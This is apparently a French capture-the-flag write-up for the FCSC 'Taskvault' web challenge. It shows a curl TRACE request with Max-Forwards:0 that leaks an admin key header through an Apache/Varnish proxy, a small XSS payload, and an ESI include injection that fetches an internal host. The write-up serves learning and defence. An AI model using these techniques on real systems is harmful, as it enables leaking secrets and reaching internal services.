Taskvault
==================

Exploit 
---------

D'abord on cherche a obtenir la clé admin,

On sait que le proxy Apache autorise l'utilisation de TRACE

Mais l'application Express ne le permet pas

On va donc utiliser Max-Forwards:0 pour que la requête n'atteigne pas le serveur express : 

.. code-block:: console
    
    curl -X TRACE -H "Max-Forwards:0" https://taskvault.fcsc.fr  

    TRACE / HTTP/1.1
    host: taskvault.fcsc.fr
    user-agent: curl/8.11.1
    accept: */*
    max-forwards: 0
    X-Forwarded-For: 176.137.240.135, 51.77.135.65
    Via: 1.1 taskvault-varnish (Varnish/7.6)
    X-Admin-Key: 6d02ed57299292a47615254957d073cc75cc7855248684960946838c1f786081
    X-Varnish: 2330548

Pour la suite on cherche à récupérer les informations du serveur inaccessible qui contient le flag, et on a également une XSS  dans note.content mais qui ne sert a rien !

Payload XSS : 

.. code-block:: html

    ${console.log(document.domain)}

On sait que le challenge à un lien avec la balise <esi> mais on n'a pas réussi à l'exploiter.

En faites on pouvait injecter direct dans id="ICI" car le varnish se fou de la structure html, il fallait juste mettre un ">" pour casser le contexte.

.. code-block:: console
    
    ><esi:include src='http://give_me_the_flag/'>

Surtout ne pas oublier le "/" à la fin de give_me_the_flag. 

On est pas passé loin mais tant pis, on aura quand même découvert ESI et Max-Forwards ! 